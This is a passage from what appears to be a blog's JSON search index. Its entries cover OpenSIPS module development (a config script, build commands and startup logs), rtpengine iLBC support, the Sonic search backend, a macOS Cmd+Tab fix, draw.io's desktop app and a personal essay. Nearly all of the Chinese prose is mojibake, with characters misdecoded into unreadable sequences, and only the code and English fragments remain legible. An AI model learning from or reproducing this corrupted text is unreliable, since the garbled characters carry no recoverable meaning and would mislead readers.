å¯åŠ¨opensipséœ€è¦ä¸€ä¸ªcfgè„šæœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬è‡ªå·±åšä¸€ä¸ªç®€å•çš„\nè„šæœ¬æœ‰ä»¥ä¸‹çš„æ³¨æ„ç‚¹ï¼š\nloadmoduleåŠ è½½home_location.soæˆ‘ä½¿ç”¨äº†ç»å¯¹è·¯å¾„ï¼Œå¦‚æœåœ¨ä½ è‡ªå·±çš„æœºå™¨ä¸Šï¼Œç›®å½•å¯èƒ½éœ€è¦ä¿®æ”¹ log_level=3 log_stderror=yes log_facility=LOG_LOCAL0 debug_mode=no memdump=1 auto_aliases=no listen=udp:0.0.0.0:17634 listen=tcp:0.0.0.0:17634 mpath=\u0026#34;/usr/local/lib64/opensips/modules/\u0026#34; loadmodule \u0026#34;proto_udp.so\u0026#34; loadmodule \u0026#34;proto_tcp.so\u0026#34; loadmodule \u0026#34;mi_fifo.so\u0026#34; modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo\u0026#34;) modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_mode\u0026#34;, 0666) loadmodule \u0026#34;/root/code/gitee/opensips/modules/home_location/home_location.so\u0026#34; startup_route{ xlog(\u0026#34;opensips startup\u0026#34;); } route{ xlog(\u0026#34;hello\u0026#34;); } è¿è¡Œdemo ./dev.sh build # æ„å»ºè„šæœ¬ ./dev.sh start # å¯åŠ¨opensips æ²¡æœ‰æ„å¤–çš„è¯ï¼Œopensipså¯åŠ¨æˆåŠŸï¼Œå¯ä»¥çœ‹ä¸‹log.txtçš„å†…å®¹ï¼Œ ä¹Ÿå¯ä»¥é€šè¿‡netstat -nulp | grep opensips æŸ¥æ‰¾opensipsçš„è¿›ç¨‹\nâœ home_location git:(home_location) âœ— tail log.txt Apr 20 23:00:37 [748389] INFO:core:main: using 2 Mb of private process memory Apr 20 23:00:37 [748389] INFO:core:init_reactor_size: reactor size 1024 (using up to 0.03Mb of memory per process) Apr 20 23:00:37 [748389] INFO:core:evi_publish_event: Registered event \u0026lt;E_CORE_THRESHOLD(0)\u0026gt; Apr 20 23:00:37 [748389] INFO:core:evi_publish_event: Registered event \u0026lt;E_CORE_SHM_THRESHOLD(1)\u0026gt; Apr 20 23:00:37 [748389] INFO:core:evi_publish_event: Registered event \u0026lt;E_CORE_PKG_THRESHOLD(2)\u0026gt; Apr 20 23:00:37 [748389] INFO:core:mod_init: initializing UDP-plain protocol Apr 20 23:00:37 [748389] INFO:core:mod_init: initializing TCP-plain protocol Apr 20 23:00:37 [748389] INFO:home_location:mod_init: initializing... Apr 20 23:00:37 [748396] opensips startupApr 20 23:00:37 [748380] INFO:core:daemonize: pre-daemon process exiting with 0 Apr 21 05:32:32 [748410] WARNING:core:handle_timer_job: timer job \u0026lt;blcore-expire\u0026gt; has a 100000 us delay in execution ","permalink":"https://wdd.js.org/opensips/module-dev/l3/","summary":"ä»å¤´å†™ä¸€ä¸ªæ¨¡å—æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºä¸€ä¸ªç®€å•çš„æ¨¡å—ï¼Œç„¶ååœ¨è¿™ä¸ªæ¨¡å—ä¸Šè¿›è¡Œä¸€äº›ä¿®æ”¹ã€‚\næˆ‘ä»¬åŸºäºmaxfwdè¿™ä¸ªæ¨¡å—ï¼Œå¤åˆ¶ä¸€ä¸ªæ¨¡å—ï¼Œå«åšhome_locationã€‚\nä¸ºä»€ä¹ˆå«åšhome_locationå‘¢ï¼Ÿå› ä¸ºæˆ‘æƒ³æ ¹æ®ä¸€ä¸ªæ‰‹æœºå·ï¼ŒæŸ¥å‡ºå®ƒçš„å½’å±åœ°ï¼Œç„¶åæ ¹æ®å½“åœ°çš„å½’å±åœ°ï¼Œåˆ¤æ–­å·ç å‰è¦ä¸è¦åŠ 0\ncd modules cp -R maxfwd home_location âœ home_location git:(home_location) âœ— ll total 300K drwxr-xr-x 2 root root 4.0K Apr 20 13:56 doc -rw-r--r-- 1 root root 217 Apr 20 14:00 Makefile -rw-r--r-- 1 root root 4.7K Apr 20 14:00 maxfwd.c -rw-r--r-- 1 root root 2.0K Apr 20 13:56 maxfwd.d -rw-r--r-- 1 root root 77K Apr 20 13:56 maxfwd.o -rwxr-xr-x 1 root root 93K Apr 20 13:56 maxfwd.so -rw-r--r-- 1 root root 4.","title":"ch3 å¤åˆ¶å¹¶è£å‰ªä¸€ä¸ªæ¨¡å—"},{"content":"ç¯å¢ƒè¯´æ˜ ubuntu 20.04 opensips 2.4 å…‹éš†ä»“åº“ ç”±äºgithubå®˜æ–¹çš„ä»“åº“cloneå¤ªæ…¢ï¼Œæœ€å¥½é€‰æ‹©ä»å›½å†…çš„giteeä¸Šå…‹éš†ã€‚\nä¸‹é¢çš„gfo, gco, gl, gcbéƒ½æ˜¯oh-my-zshä¸­gitæ’ä»¶çš„å¿«æ·é”®ã€‚å»ºè®®ä½ è¦ä¹ˆå®‰è£…oh-my-zsh, æˆ–è€…ä¹Ÿå¯ä»¥çœ‹çœ‹è¿™äº›å¿«æ·æ–¹å¼å¯¹åº”çš„åº•å±‚å‘½ä»¤æ˜¯ä»€ä¹ˆ https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git\ngit clone https://gitee.com/wangduanduan/opensips.git gfo 2.4:2.4 gco 2.4 gl gcb home_location #åŸºäº2.4åˆ†æ”¯åˆ›å»ºhome_locationåˆ†æ”¯ å®‰è£…ä¾èµ– apt update apt install -y build-essential bison flex m4 pkg-config libncurses5-dev \\ rsyslog libmysqlclient-dev \\ libssl-dev mysql-client libmicrohttpd-dev libcurl4-openssl-dev uuid-dev \\ libpcre3-dev libconfuse-dev libxml2-dev libhiredis-dev ç¼–è¯‘å®‰è£… make all -j4 include_modules=\u0026#34;db_mysql\u0026#34; make install include_modules=\u0026#34;db_mysql\u0026#34; æµ‹è¯• âœ opensips git:(home_location) opensips -V version: opensips 2.4.9 (x86_64/linux) flags: STATS: On, DISABLE_NAGLE, USE_MCAST, SHM_MMAP, PKG_MALLOC, F_MALLOC, FAST_LOCK-ADAPTIVE_WAIT ADAPTIVE_WAIT_LOOPS=1024, MAX_RECV_BUFFER_SIZE 262144, MAX_LISTEN 16, MAX_URI_SIZE 1024, BUF_SIZE 65535 poll method support: poll, epoll, sigio_rt, select. git revision: 9c2c8638e main.c compiled on 13:49:33 Apr 20 2021 with gcc 9 ","permalink":"https://wdd.js.org/opensips/module-dev/l2/","summary":"ç¯å¢ƒè¯´æ˜ ubuntu 20.04 opensips 2.4 å…‹éš†ä»“åº“ ç”±äºgithubå®˜æ–¹çš„ä»“åº“cloneå¤ªæ…¢ï¼Œæœ€å¥½é€‰æ‹©ä»å›½å†…çš„giteeä¸Šå…‹éš†ã€‚\nä¸‹é¢çš„gfo, gco, gl, gcbéƒ½æ˜¯oh-my-zshä¸­gitæ’ä»¶çš„å¿«æ·é”®ã€‚å»ºè®®ä½ è¦ä¹ˆå®‰è£…oh-my-zsh, æˆ–è€…ä¹Ÿå¯ä»¥çœ‹çœ‹è¿™äº›å¿«æ·æ–¹å¼å¯¹åº”çš„åº•å±‚å‘½ä»¤æ˜¯ä»€ä¹ˆ https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git\ngit clone https://gitee.com/wangduanduan/opensips.git gfo 2.4:2.4 gco 2.4 gl gcb home_location #åŸºäº2.4åˆ†æ”¯åˆ›å»ºhome_locationåˆ†æ”¯ å®‰è£…ä¾èµ– apt update apt install -y build-essential bison flex m4 pkg-config libncurses5-dev \\ rsyslog libmysqlclient-dev \\ libssl-dev mysql-client libmicrohttpd-dev libcurl4-openssl-dev uuid-dev \\ libpcre3-dev libconfuse-dev libxml2-dev libhiredis-dev ç¼–è¯‘å®‰è£… make all -j4 include_modules=\u0026#34;db_mysql\u0026#34; make install include_modules=\u0026#34;db_mysql\u0026#34; æµ‹è¯• âœ opensips git:(home_location) opensips -V version: opensips 2.4.9 (x86_64/linux) flags: STATS: On, DISABLE_NAGLE, USE_MCAST, SHM_MMAP, PKG_MALLOC, F_MALLOC, FAST_LOCK-ADAPTIVE_WAIT ADAPTIVE_WAIT_LOOPS=1024, MAX_RECV_BUFFER_SIZE 262144, MAX_LISTEN 16, MAX_URI_SIZE 1024, BUF_SIZE 65535 poll method support: poll, epoll, sigio_rt, select.","title":"ch2 åˆå§‹åŒ–ç¯å¢ƒ"},{"content":"Intro Sonic is a fast, lightweight and schema-less search backend. It ingests search texts and identifier tuples that can then be queried against in a microsecond\u0026rsquo;s time.\ninstall ref https://github.com/valeriansaliou/sonic https://crates.io/crates/sonic-server ","permalink":"https://wdd.js.org/posts/2021/04/kvg1r9/","summary":"Intro Sonic is a fast, lightweight and schema-less search backend. It ingests search texts and identifier tuples that can then be queried against in a microsecond\u0026rsquo;s time.\ninstall ref https://github.com/valeriansaliou/sonic https://crates.io/crates/sonic-server ","title":"learn Sonic"},{"content":"ä»Šå¤©å‘ç°ä¸€ä¸ªé—®é¢˜ï¼ŒæŒ‰ä½command + tab, å·²ç»åˆ‡æ¢åˆ°å¯¹åº”çš„åº”ç”¨å›¾æ ‡ä¸Šï¼Œä½†æ˜¯æ¾å¼€æŒ‰é”®ä¹‹åï¼Œå±å¹•å¹¶æ²¡æœ‰åˆ‡æ¢åˆ°æ–°çš„Appå±å¹•ä¸Šã€‚ç‰¹åˆ«æ˜¯é‚£äº›å…¨å±çš„åº”ç”¨ã€‚\nçœ‹äº†å¾ˆå¤šèµ„æ–™ï¼Œéƒ½æ˜¯æ²¡å•¥ç”¨çš„ï¼Œæœ€åå‘ç°\nhttps://apple.stackexchange.com/questions/112350/cmdtab-does-not-work-on-hidden-or-minimized-windows æœ€ç»ˆå‘ç°ï¼Œéœ€è¦è®¾ç½®è°ƒåº¦ä¸­å¿ƒçš„ åˆ‡æ¢åˆ°æŸä¸ªåº”ç”¨æ—¶ï¼Œä¼šåˆ‡æ¢åˆ°åŒ…å«è¯¥åº”ç”¨ç¨‹åºçš„æ‰“å¼€çš„çª—å£ç©ºé—´ï¼Œ è¿™ä¸ªå¿…éœ€è¦å‹¾é€‰ã€‚\n","permalink":"https://wdd.js.org/posts/2021/04/gt9iss/","summary":"ä»Šå¤©å‘ç°ä¸€ä¸ªé—®é¢˜ï¼ŒæŒ‰ä½command + tab, å·²ç»åˆ‡æ¢åˆ°å¯¹åº”çš„åº”ç”¨å›¾æ ‡ä¸Šï¼Œä½†æ˜¯æ¾å¼€æŒ‰é”®ä¹‹åï¼Œå±å¹•å¹¶æ²¡æœ‰åˆ‡æ¢åˆ°æ–°çš„Appå±å¹•ä¸Šã€‚ç‰¹åˆ«æ˜¯é‚£äº›å…¨å±çš„åº”ç”¨ã€‚\nçœ‹äº†å¾ˆå¤šèµ„æ–™ï¼Œéƒ½æ˜¯æ²¡å•¥ç”¨çš„ï¼Œæœ€åå‘ç°\nhttps://apple.stackexchange.com/questions/112350/cmdtab-does-not-work-on-hidden-or-minimized-windows æœ€ç»ˆå‘ç°ï¼Œéœ€è¦è®¾ç½®è°ƒåº¦ä¸­å¿ƒçš„ åˆ‡æ¢åˆ°æŸä¸ªåº”ç”¨æ—¶ï¼Œä¼šåˆ‡æ¢åˆ°åŒ…å«è¯¥åº”ç”¨ç¨‹åºçš„æ‰“å¼€çš„çª—å£ç©ºé—´ï¼Œ è¿™ä¸ªå¿…éœ€è¦å‹¾é€‰ã€‚","title":"command + tab æ— æ³•åˆ‡æ¢çª—å£äº†ï¼Ÿ"},{"content":"ilbcçš„ç¼–ç ç‰¹å®šæ˜¯å ç”¨å¸¦å®½å°ï¼Œå¹¶ä¸”æŠ—ä¸¢è¡¨ã€‚ä½†æ˜¯rtpengineæ˜¯ä¸æ”¯æŒilbcç¼–ç çš„ï¼Œå¯ä»¥å‚è€ƒçš„èµ„æ–™æœ‰ä»¥ä¸‹ä¸¤ä¸ª\nhttps://github.com/sipwise/rtpengine/issues/897 https://sr-users.sip-router.narkive.com/f3jhDeyU/rtpengine-and-ilbc-support ä½¿ç”¨rtpengine --codecså¯ä»¥æ‰“å°å‡ºrtpengineæ”¯æŒçš„ç¼–è§£ç \nrtpengine --codecs PCMA: fully supported PCMU: fully supported G723: fully supported G722: fully supported QCELP: supported for decoding only G729: supported for decoding only speex: fully supported GSM: fully supported iLBC: not supported opus: fully supported vorbis: fully supported ac3: fully supported eac3: fully supported ATRAC3: supported for decoding only ATRAC-X: supported for decoding only AMR: fully supported AMR-WB: fully supported PCM-S16LE: fully supported MP3: fully supported ä¸‹é¢çš„æ“ä½œåŸºäºdebian:9-slimçš„åŸºç¡€é•œåƒæ„å»ºçš„ï¼Œåœ¨æ„å»ºrtpengineä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆç¼–è¯‘ilbcçš„ä¾èµ–åº“\nRUN echo \u0026#34;deb http://www.deb-multimedia.org stretch main\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list \\ \u0026amp;\u0026amp; apt-get update \\ \u0026amp;\u0026amp; apt-get install deb-multimedia-keyring -y --allow-unauthenticated \\ \u0026amp;\u0026amp; apt-get install libilbc-dev libavcodec-dev libilbc2 -y --allow-unauthenticated å®‰è£…ä»¥æ¥ä¹‹åï¼Œç»§ç»­æ„å»ºrtpengine, rtpengineæ„å»ºå®Œä¹‹åï¼Œæ‰§è¡Œrtpengine --codecs\n","permalink":"https://wdd.js.org/opensips/ch9/rtpengine-ilbc/","summary":"ilbcçš„ç¼–ç ç‰¹å®šæ˜¯å ç”¨å¸¦å®½å°ï¼Œå¹¶ä¸”æŠ—ä¸¢è¡¨ã€‚ä½†æ˜¯rtpengineæ˜¯ä¸æ”¯æŒilbcç¼–ç çš„ï¼Œå¯ä»¥å‚è€ƒçš„èµ„æ–™æœ‰ä»¥ä¸‹ä¸¤ä¸ª\nhttps://github.com/sipwise/rtpengine/issues/897 https://sr-users.sip-router.narkive.com/f3jhDeyU/rtpengine-and-ilbc-support ä½¿ç”¨rtpengine --codecså¯ä»¥æ‰“å°å‡ºrtpengineæ”¯æŒçš„ç¼–è§£ç \nrtpengine --codecs PCMA: fully supported PCMU: fully supported G723: fully supported G722: fully supported QCELP: supported for decoding only G729: supported for decoding only speex: fully supported GSM: fully supported iLBC: not supported opus: fully supported vorbis: fully supported ac3: fully supported eac3: fully supported ATRAC3: supported for decoding only ATRAC-X: supported for decoding only AMR: fully supported AMR-WB: fully supported PCM-S16LE: fully supported MP3: fully supported ä¸‹é¢çš„æ“ä½œåŸºäºdebian:9-slimçš„åŸºç¡€é•œåƒæ„å»ºçš„ï¼Œåœ¨æ„å»ºrtpengineä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆç¼–è¯‘ilbcçš„ä¾èµ–åº“","title":"rtpengine å¢åŠ å¯¹ilbcç¼–è§£ç çš„æ”¯æŒ"},{"content":"å½“ä½ éœ€è¦è§£é‡Šä¸€ä¸ªæ¦‚å¿µçš„æ—¶å€™ï¼Œå›¾å½¢åŒ–çš„å±•ç¤ºæ˜¯æœ€å®¹æ˜“è®©äººç†è§£çš„æ–¹å¼ã€‚\nä»¥å‰æˆ‘ä¸€ç›´ç”¨processonæ¥ç»˜åˆ¶ï¼Œ processonçš„ä¼˜ç‚¹å¾ˆå¤šï¼Œç”¨è¿‡çš„éƒ½çŸ¥é“ã€‚\nä½†æ˜¯ç¼ºç‚¹ä¹Ÿæ˜¯éå¸¸æ˜æ˜¾çš„ã€‚\nå®šä»·è¿‡é«˜ ä¸æ”¯æŒç¦»çº¿ä½¿ç”¨ è™½ç„¶processonçš„ä½¿ç”¨ä½“éªŒè¿˜ä¸é”™ï¼Œä½†æ˜¯å¯¹æˆ‘ä¸ªäººæ¥è¯´ï¼Œä½¿ç”¨çš„é¢‘ç‡å¹¶ä¸é«˜ å…è´¹çš„ä¼šå‘˜æœ€å¤šåªæœ‰19ä¸ªæ–‡ä»¶å¯ä»¥ä½¿ç”¨ æœ‰ä¸€å¹´ï¼Œæˆ‘çš„æ–‡ä»¶è¶…è¿‡äº†19ä¸ªï¼Œæˆ‘å°±åªèƒ½ä¹°ä¼šå‘˜äº†ã€‚ä¼šå‘˜åˆ°æœŸåï¼Œæˆ‘å°±æ²¡æœ‰ç»­è´¹ï¼Œå› ä¸ºä½¿ç”¨çš„é¢‘ç‡å¤ªä½ã€‚\nå…³äºprocessonå®šä»· æˆ‘ä»¬æ¨ªå‘å¯¹æ¯”ä¸€ä¸‹å‡ ä¸ªäº’è”ç½‘äº§å“çš„æ”¶è´¹æ ‡å‡†ï¼Œ ä»ä¸‹è¡¨å¯ä»¥çœ‹å‡ºï¼ŒProcessonçš„å®šä»·ä¸è²ã€‚\né¡¹ç›® æ”¶è´¹æ ‡å‡† æœ€ä½å¹´è´¹ç”¨ processon å‡çº§åˆ°ä¸ªäººç‰ˆ 159/å¹´ 159 è¯­é›€ä¼šå‘˜ æ ‡å‡†99 é™æ—¶ç‰¹æƒ 69/å¹´ 69 å°è±¡ç¬”è®° - æ ‡å‡† 8.17/æœˆ- é«˜çº§ 12.33/æœˆ- ä¸“ä¸š 16.50/æœˆ - æ ‡å‡† 98- é«˜çº§ 148- ä¸“ä¸š 198 bç«™å¤§ä¼šå‘˜ è¿ç»­åŒ…å¹´ 6.3æŠ˜ 148/å¹´ - 148 çˆ±å¥‡è‰º - é»„é‡‘VIPä¼šå‘˜ é¦–å¹´138/å¹´ï¼Œæ¬¡å¹´ç»­è´¹218 - 138 ç½‘æ˜“äº‘éŸ³ä¹ - è¿ç»­åŒ…å¹´ 99 - 99 draw.io æ˜¯ä»€ä¹ˆ draw.ioçš„åŠŸèƒ½æ¶µç›–äº†processonçš„å¾ˆå¤šåŠŸèƒ½ï¼Œä½†æ˜¯å…¶æœ€å¤§çš„å–ç‚¹æ˜¯**å…è´¹ã€‚ï¼ˆ**åœˆä½ï¼Œè¦è€ƒï¼ï¼‰\nä½†æ˜¯å…è´¹çš„ä¸œè¥¿ä¸å¥½ç”¨ï¼Œä¹Ÿä¸ä¸€å®šæœ‰äººä¼šæœ‰ã€‚ä½†æ˜¯draw.ioåœ¨å…è´¹çš„åŸºç¡€ä¸Šï¼Œåšåˆ°äº†ä½¿ç”¨ä½“éªŒè¿˜ä¸é”™ï¼Œè¿™å°±éš¾èƒ½å¯è´µäº†ã€‚\næœ€æ—©æ¥è§¦çš„æ˜¯draw.ioçš„åœ¨çº¿ç‰ˆï¼Œç›´åˆ°æœ€è¿‘æ‰å‘ç°ï¼ŒåŸæ¥draw.ioä¹Ÿæœ‰æ¡Œé¢å®¢æˆ·ç«¯çš„ï¼Œè€Œä¸”è¿˜å¯ä»¥ç¦»çº¿ä½¿ç”¨ã€‚\nå¤ªçˆ½äº†ï¼Œæœæ–­ä¸‹è½½ä½“éªŒã€‚\nä¸‹è½½åœ°å€ï¼šhttps://github.com/jgraph/drawio-desktop/releases\nä»release Notesä¸Šå¯ä»¥çœ‹å‡ºï¼Œdraw.ioçš„å®¢æˆ·ç«¯åŸºæœ¬ä¸Šæ˜¯å…¨å¹³å°å…¼å®¹äº†ï¼Œ å› ä¸ºæ˜¯åŸºäºElectronåšçš„ï¼Œä¸æƒ³å…¼å®¹éƒ½ä¸è¡Œå•Šï¼\n","permalink":"https://wdd.js.org/posts/2021/04/zf3xgd/","summary":"å½“ä½ éœ€è¦è§£é‡Šä¸€ä¸ªæ¦‚å¿µçš„æ—¶å€™ï¼Œå›¾å½¢åŒ–çš„å±•ç¤ºæ˜¯æœ€å®¹æ˜“è®©äººç†è§£çš„æ–¹å¼ã€‚\nä»¥å‰æˆ‘ä¸€ç›´ç”¨processonæ¥ç»˜åˆ¶ï¼Œ processonçš„ä¼˜ç‚¹å¾ˆå¤šï¼Œç”¨è¿‡çš„éƒ½çŸ¥é“ã€‚\nä½†æ˜¯ç¼ºç‚¹ä¹Ÿæ˜¯éå¸¸æ˜æ˜¾çš„ã€‚\nå®šä»·è¿‡é«˜ ä¸æ”¯æŒç¦»çº¿ä½¿ç”¨ è™½ç„¶processonçš„ä½¿ç”¨ä½“éªŒè¿˜ä¸é”™ï¼Œä½†æ˜¯å¯¹æˆ‘ä¸ªäººæ¥è¯´ï¼Œä½¿ç”¨çš„é¢‘ç‡å¹¶ä¸é«˜ å…è´¹çš„ä¼šå‘˜æœ€å¤šåªæœ‰19ä¸ªæ–‡ä»¶å¯ä»¥ä½¿ç”¨ æœ‰ä¸€å¹´ï¼Œæˆ‘çš„æ–‡ä»¶è¶…è¿‡äº†19ä¸ªï¼Œæˆ‘å°±åªèƒ½ä¹°ä¼šå‘˜äº†ã€‚ä¼šå‘˜åˆ°æœŸåï¼Œæˆ‘å°±æ²¡æœ‰ç»­è´¹ï¼Œå› ä¸ºä½¿ç”¨çš„é¢‘ç‡å¤ªä½ã€‚\nå…³äºprocessonå®šä»· æˆ‘ä»¬æ¨ªå‘å¯¹æ¯”ä¸€ä¸‹å‡ ä¸ªäº’è”ç½‘äº§å“çš„æ”¶è´¹æ ‡å‡†ï¼Œ ä»ä¸‹è¡¨å¯ä»¥çœ‹å‡ºï¼ŒProcessonçš„å®šä»·ä¸è²ã€‚\né¡¹ç›® æ”¶è´¹æ ‡å‡† æœ€ä½å¹´è´¹ç”¨ processon å‡çº§åˆ°ä¸ªäººç‰ˆ 159/å¹´ 159 è¯­é›€ä¼šå‘˜ æ ‡å‡†99 é™æ—¶ç‰¹æƒ 69/å¹´ 69 å°è±¡ç¬”è®° - æ ‡å‡† 8.17/æœˆ- é«˜çº§ 12.33/æœˆ- ä¸“ä¸š 16.50/æœˆ - æ ‡å‡† 98- é«˜çº§ 148- ä¸“ä¸š 198 bç«™å¤§ä¼šå‘˜ è¿ç»­åŒ…å¹´ 6.3æŠ˜ 148/å¹´ - 148 çˆ±å¥‡è‰º - é»„é‡‘VIPä¼šå‘˜ é¦–å¹´138/å¹´ï¼Œæ¬¡å¹´ç»­è´¹218 - 138 ç½‘æ˜“äº‘éŸ³ä¹ - è¿ç»­åŒ…å¹´ 99 - 99 draw.io æ˜¯ä»€ä¹ˆ draw.ioçš„åŠŸèƒ½æ¶µç›–äº†processonçš„å¾ˆå¤šåŠŸèƒ½ï¼Œä½†æ˜¯å…¶æœ€å¤§çš„å–ç‚¹æ˜¯**å…è´¹ã€‚ï¼ˆ**åœˆä½ï¼Œè¦è€ƒï¼ï¼‰\nä½†æ˜¯å…è´¹çš„ä¸œè¥¿ä¸å¥½ç”¨ï¼Œä¹Ÿä¸ä¸€å®šæœ‰äººä¼šæœ‰ã€‚ä½†æ˜¯draw.ioåœ¨å…è´¹çš„åŸºç¡€ä¸Šï¼Œåšåˆ°äº†ä½¿ç”¨ä½“éªŒè¿˜ä¸é”™ï¼Œè¿™å°±éš¾èƒ½å¯è´µäº†ã€‚\næœ€æ—©æ¥è§¦çš„æ˜¯draw.ioçš„åœ¨çº¿ç‰ˆï¼Œç›´åˆ°æœ€è¿‘æ‰å‘ç°ï¼ŒåŸæ¥draw.ioä¹Ÿæœ‰æ¡Œé¢å®¢æˆ·ç«¯çš„ï¼Œè€Œä¸”è¿˜å¯ä»¥ç¦»çº¿ä½¿ç”¨ã€‚\nå¤ªçˆ½äº†ï¼Œæœæ–­ä¸‹è½½ä½“éªŒã€‚\nä¸‹è½½åœ°å€ï¼šhttps://github.com/jgraph/drawio-desktop/releases\nä»release Notesä¸Šå¯ä»¥çœ‹å‡ºï¼Œdraw.ioçš„å®¢æˆ·ç«¯åŸºæœ¬ä¸Šæ˜¯å…¨å¹³å°å…¼å®¹äº†ï¼Œ å› ä¸ºæ˜¯åŸºäºElectronåšçš„ï¼Œä¸æƒ³å…¼å®¹éƒ½ä¸è¡Œå•Šï¼","title":"draw.ioå±…ç„¶æœ‰æ¡Œé¢å®¢æˆ·ç«¯äº†"},{"content":"æœ€è¿‘å‡ ä¸ªæœˆï¼Œä¸€ç›´æœ‰äº›ä¸é¡ºå¿ƒçš„äº‹æƒ…è®©æˆ‘çƒ¦æ¼ã€‚\nä¸‹äº†æ‰¶æ¢¯ï¼Œèµ°åœ¨ç«™å°ä¸Šå¾€ç«è½¦ä¸Šï¼Œå¾€äºŒå·è½¦å¢èµ°å»ã€‚åŒè¡Œçš„é™Œç”Ÿäººè¡Œè‰²åŒ†åŒ†ï¼Œæ— ä¸€é€—ç•™ã€‚\nåŠ¨è½¦çš„è½¦å¤´ä¸Šï¼Œä¸çŸ¥é“æ˜¯ç¢°åˆ°äº†ä»€ä¹ˆä¸œè¥¿ï¼ŒæŸ“äº†ä¸€å¤§ç‰‡é»„è‰²çš„æ±¡æ¸ï¼Œä»¿ä½›æ˜¯æ’åˆ°ä¸çŸ¥åçš„åŠ¨ç‰©è€Œç•™ä¸‹çš„ç—•è¿¹ã€‚è½¦ç¯å®›å¦‚ä¸€ä¸ªå¤§å·çš„ä¸‰è§’çœ¼ï¼Œç›´å‹¾å‹¾çš„å¾€å‰æœ›ç€ï¼Œä¸çŸ¥é“åœ¨å†æƒ³äº›ä»€ä¹ˆã€‚\nçªç„¶æˆ‘çš„è„‘å­é‡Œè¿¸å°„å‡ºä¸€ä¸ªé—®é¢˜: äººä¸ºä»€ä¹ˆæ´»ç€ï¼Ÿ\nè®°å¾—ä»¥å‰è¯¾æœ¬ä¸Šè¯´ï¼Œäººå’ŒåŠ¨ç‰©çš„åŒºåˆ«æ˜¯äººä¼šä½¿ç”¨å·¥å…·ã€‚ä½†æ˜¯æˆ‘æƒ³åœ¨è§‰å¾—ï¼Œäººå’ŒåŠ¨ç‰©çš„åŒºåˆ«åº”è¯¥æ˜¯ï¼Œäººä¼šé—®è‡ªå·±: æˆ‘ä»€ä¹ˆæ´»ç€ã€‚è€ŒåŠ¨ç‰©å‡­æœ¬èƒ½è¡ŒåŠ¨ï¼Œä¼¼ä¹å¹¶ä¸ä¼šè€ƒè™‘æ´»ç€è¿™ä¹ˆæ·±å¥¥çš„é—®é¢˜ã€‚\nä¸€åªèš‚èšåœ¨ä¸€æ ¹ç»³çˆ¬ï¼Œåªæœ‰ä¸¤ä¸ªæ–¹å‘ï¼Œè¦ä¹ˆå‰è¿›ï¼Œè¦ä¹ˆåé€€ã€‚æœ‰ä¸ªèš‚èšä¼¼ä¹å‘ç°äº†ç¬¬ä¸‰ä¸ªæ–¹å‘ï¼Œå°±æ˜¯å¯ä»¥ç»•ç€ç»³å­è½¬åœˆåœˆã€‚è€Œä¼šè½¬åœˆåœˆçš„èš‚èšï¼Œä¼¼ä¹å°±æ˜¯é‚£ä¸ªå®¹æ˜“çƒ¦æ¼çš„èš‚èšã€‚\nè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è€ƒè™‘äººä¸ºä»€ä¹ˆæ´»ç€è¿™ä¸ªé—®é¢˜ã€‚å›é¦–è¿‡å»ï¼Œæˆ‘è§‰å¾—è‡ªå·±æ˜¯ä¸ªåŠ¨ç‰©ï¼Œå‡­å€Ÿæœ¬èƒ½ç”Ÿæ´»ï¼Œé¥¿äº†å°±åƒï¼Œç´¯äº†å°±ç¡ã€‚\næ„Ÿè§‰æ¯ä¸€å¤©éƒ½æ˜¯ä¸€ä¸ªå‘¨æœŸå‡½æ•°ï¼Œæ°¸ä¸åœæ­¢çš„é‡å¤ä¸Šä¸‹æ³¢åŠ¨ã€‚\næœ€è¿‘åˆšå¥½å¯¹å£°çº¹è¯†åˆ«æœ‰äº›å…´è¶£ï¼Œåœ¨è¿™ä¸ªé¢†åŸŸï¼Œæœ‰ä¸ªæŠ€æœ¯å«åšå‚…é‡Œå¶å˜æ¢ã€‚å°±æ˜¯æŠŠä¸€ä¸ªæ—¶åŸŸçš„ä¿¡å·è½¬æ¢æˆé¢‘åŸŸçš„ä¿¡å·ã€‚å®é™…çš„ç‰©ç†ä½œç”¨å¹¶æ²¡æœ‰å˜åŒ–ï¼Œåªæ˜¯çœ‹å¾…äº‹ç‰©çš„è§’åº¦å‘ç”Ÿå˜åŒ–ï¼Œè€Œçœ‹åˆ°çš„ä¸œè¥¿å´ä¸ä¸€æ ·äº†ã€‚\næˆ‘è§‰å¾—æˆ‘ä¹Ÿéœ€è¦å¯¹æˆ‘çš„ç”Ÿæ´»åšä¸ªå‚…é‡Œå¶å˜æ¢ï¼Œæ‰¾åˆ°ä¸€äº›èƒ½è§£å†³æˆ‘å›°æƒ‘çš„ç­”æ¡ˆã€‚\n","permalink":"https://wdd.js.org/posts/2021/04/qb6asq/","summary":"æœ€è¿‘å‡ ä¸ªæœˆï¼Œä¸€ç›´æœ‰äº›ä¸é¡ºå¿ƒçš„äº‹æƒ…è®©æˆ‘çƒ¦æ¼ã€‚\nä¸‹äº†æ‰¶æ¢¯ï¼Œèµ°åœ¨ç«™å°ä¸Šå¾€ç«è½¦ä¸Šï¼Œå¾€äºŒå·è½¦å¢èµ°å»ã€‚åŒè¡Œçš„é™Œç”Ÿäººè¡Œè‰²åŒ†åŒ†ï¼Œæ— 